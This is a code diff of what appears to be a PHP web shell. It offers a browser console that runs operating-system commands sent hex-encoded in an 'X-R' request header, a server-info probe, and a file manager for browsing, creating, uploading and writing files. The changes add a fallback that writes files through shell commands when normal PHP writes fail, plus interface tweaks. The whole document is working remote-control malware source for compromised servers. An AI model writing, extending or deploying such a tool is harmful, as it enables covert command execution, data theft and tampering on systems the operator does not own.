@@ -222,7 +222,7 @@ function fm_write($path, $content) {
     if ($r !== false) {
         return array('ok' => true, 'bytes' => $r, 'mode' => 'native');
     }
-    
+
     $f = @fopen($path, 'w');
     if ($f) {
         $r = @fwrite($f, $content);
@@ -231,7 +231,21 @@ function fm_write($path, $content) {
             return array('ok' => true, 'bytes' => $r, 'mode' => 'fopen');
         }
     }
-    
+
+    if (exec_best() !== '') {
+        $tmp = @tempnam(@sys_get_temp_dir(), 'up');
+        if ($tmp && @file_put_contents($tmp, $content) !== false) {
+            $cmd = is_win()
+                ? 'cmd /c copy /Y ' . sq($tmp) . ' ' . sq($path)
+                : 'cat ' . sq($tmp) . ' > ' . sq($path) . ' 2>&1';
+            run_cmd($cmd);
+            @unlink($tmp);
+            if (@file_exists($path) && @filesize($path) === strlen($content)) {
+                return array('ok' => true, 'bytes' => strlen($content), 'mode' => 'cmd');
+            }
+        }
+    }
+
     return array('ok' => false, 'error' => 'All write methods failed');
 }
 
@@ -606,8 +620,9 @@ function render_ui() {
   button:hover { background:#273449; }
   button:active { transform:translateY(1px); }
   #out { background:#08080a; border:1px solid #1e1e24; border-radius:6px;
-         color:#7ee787; padding:12px; min-height:160px; max-height:50vh;
-         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px; }
+         color:#7ee787; padding:12px; width:100%; min-height:160px; max-height:50vh;
+         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px; 
+         font-family:ui-monospace,Consolas,monospace; resize:vertical; outline:none; }
   .meta { color:#666; font-size:11.5px; }
   hr { border:0; border-top:1px solid #1e1e24; margin:20px 0; }
 
@@ -621,9 +636,10 @@ function render_ui() {
   #fmTable th, #fmTable td { text-align:left; padding:6px 8px;
       border-bottom:1px solid #1e1e24; overflow:hidden; text-overflow:ellipsis; }
   #fmTable th { color:#9ad; font-weight:600; background:#141418; position:sticky; top:0; z-index:1; }
+  #fmTable th.actions { text-align:right; padding-right:10px; }
   #fmTable tr:hover td { background:#14141a; }
   #fmTable td.name { white-space:nowrap; }
-  #fmTable td.actions { white-space:nowrap; padding-right:10px; }
+  #fmTable td.actions { white-space:nowrap; padding-right:10px; text-align:right; }
   #fmTable td.actions button { padding:3px 7px; font-size:11.5px; margin-right:4px; }
   #fmTable td.actions button:last-child { margin-right:0; }
   #fmTable a.fmLink { color:#7aa2f7; text-decoration:none; cursor:pointer; }
@@ -656,9 +672,9 @@ function render_ui() {
   <input id="c" placeholder="command (id / whoami / dir / uname -a)" autofocus>
   <button onclick="run()">run</button>
   <button onclick="info()">server info</button>
-  <button onclick="document.getElementById('out').textContent='';">clear</button>
+  <button onclick="document.getElementById('out').value='';">clear</button>
 </div>
-<div id="out">loading...</div>
+<textarea id="out" readonly>loading...</textarea>
 <div class="meta">Enter = run | payload sent as hex in header X-R | fn auto-detected server-side.</div>
 
 <hr>
@@ -666,8 +682,6 @@ function render_ui() {
 <h1>files <span id="fmMode"></span></h1>
 
 <div class="row" id="fmPathRow">
-  <button onclick="fmUp()">up</button>
-  <button onclick="fmHome()">cwd</button>
   <button onclick="fmMkdir()">new folder</button>
   <button onclick="fmNewFile()">new file</button>
   <button onclick="fmUpload()">upload</button>
@@ -697,7 +711,7 @@ function render_ui() {
   <thead>
     <tr>
       <th><input type="checkbox" id="fmAll" onchange="fmToggleAll(this)"></th>
-      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th>
+      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th class="actions">Actions <button onclick="fmUp()">up</button> <button onclick="fmHome()">cwd</button></th>
     </tr>
   </thead>
   <tbody></tbody>
@@ -745,22 +759,22 @@ async function run() {
   if (!cmd) return;
   const fn = $('#fn').value;
   const payload = fn ? hex(fn) + ':' + hex(cmd) : hex(cmd);
-  $('#out').textContent = '...';
+  $('#out').value = '...';
   try {
     const t = await callConsole({ 'X-R': payload });
-    $('#out').textContent = t || '(empty)';
+    $('#out').value = t || '(empty)';
   } catch (e) {
-    $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
 async function info() {
-  $('#out').textContent = 'loading...';
+  $('#out').value = 'loading...';
   try {
     const r = await fmCall('debug', {});
     const t = await r.text();
-    $('#out').textContent = t;
+    $('#out').value = t;
   } catch (e) {
-    $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
 
@@ -772,6 +786,7 @@ async function infoShort() {
   } catch (e) {}
 }
 $('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
+$('#fmPath').addEventListener('keydown', e => { if (e.key === 'Enter') fmGo(); });
 
 let fmCwd = '';
 let fmEntries = [];
@@ -1043,10 +1058,24 @@ async function fmUpload() {
         body: 'u=' + h
       });
       const j = await r.json();
-      if (!j.ok) { alert('upload failed: ' + j.error); }
-      else { $('#fmStatus').textContent = 'uploaded ' + j.bytes + ' bytes'; }
+      if (!j.ok) { 
+        $('#fmStatus').textContent = '✗ ' + f.name + ': ' + j.error;
+        $('#fmStatus').style.color = '#f97583';
+      } else { 
+        $('#fmStatus').textContent = '✓ ' + f.name + ' (' + fmtSize(j.bytes) + ')';
+        $('#fmStatus').style.color = '#7ee787';
+      }
+      setTimeout(() => { 
+        $('#fmStatus').textContent = ''; 
+        $('#fmStatus').style.color = ''; 
+      }, 3000);
     } catch (e) {
-      alert('upload error: ' + (e.name === 'AbortError' ? 'timeout' : e.message));
+      $('#fmStatus').textContent = '✗ ' + f.name + ': ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+      $('#fmStatus').style.color = '#f97583';
+      setTimeout(() => { 
+        $('#fmStatus').textContent = ''; 
+        $('#fmStatus').style.color = ''; 
+      }, 3000);
     }
     fmRefresh();
   };
@@ -1054,13 +1083,13 @@ async function fmUpload() {
 }
 
 async function boot() {
-  $('#out').textContent = 'loading...';
+  $('#out').value = 'loading...';
   try {
     const r = await fmCall('debug', {});
     const t = await r.text();
-    $('#out').textContent = t;
+    $('#out').value = t;
   } catch (e) {
-    $('#out').textContent = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+    $('#out').value = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
 
